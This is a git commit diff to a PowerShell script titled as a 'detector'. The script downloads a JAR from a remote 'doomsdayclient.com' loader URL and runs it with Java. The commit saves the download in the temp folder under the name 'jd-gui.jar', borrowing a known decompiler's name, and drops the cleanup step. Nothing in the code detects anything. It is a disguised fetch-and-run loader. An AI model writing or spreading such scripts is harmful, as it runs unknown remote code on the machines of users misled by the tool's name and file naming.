7a2446c14c9677248341a895c568ee1a2e181577
l4rpsucks <niokisucksatemails@gmail.com>
2025-09-14 17:47:12 -0400

    Update doosmdaydetector.ps1

--- doosmdaydetector.ps1
+++ doosmdaydetector.ps1
@@ -1,18 +1,14 @@
 # Define the URL of the JAR file
 $jarUrl = "https://doomsdayclient.com/loader/v5ab4f8018d.jar"
 
-# Download the JAR file into a byte array
-$jarBytes = Invoke-WebRequest -Uri $jarUrl -UseBasicParsing | Select-Object -ExpandProperty Content
+# Define a temporary path for the downloaded JAR (saved as jd-gui.jar)
+$jarPath = Join-Path $env:TEMP "jd-gui.jar"
+
+# Download the JAR file to disk
+Invoke-WebRequest -Uri $jarUrl -OutFile $jarPath -UseBasicParsing
 
 # Define the path to the Java executable
 $javaPath = "C:\Program Files\Java\jre1.8.0_301\bin\java.exe"
 
-# Create a temporary file to hold the JAR content
-$tempFile = [System.IO.Path]::GetTempFileName()
-[System.IO.File]::WriteAllBytes($tempFile, $jarBytes)
-
 # Execute the JAR file using the Java executable
-Start-Process -FilePath $javaPath -ArgumentList "-jar", $tempFile -NoNewWindow -Wait
-
-# Clean up the temporary file
-Remove-Item -Path $tempFile
+Start-Process -FilePath $javaPath -ArgumentList "-jar", $jarPath -NoNewWindow -Wait
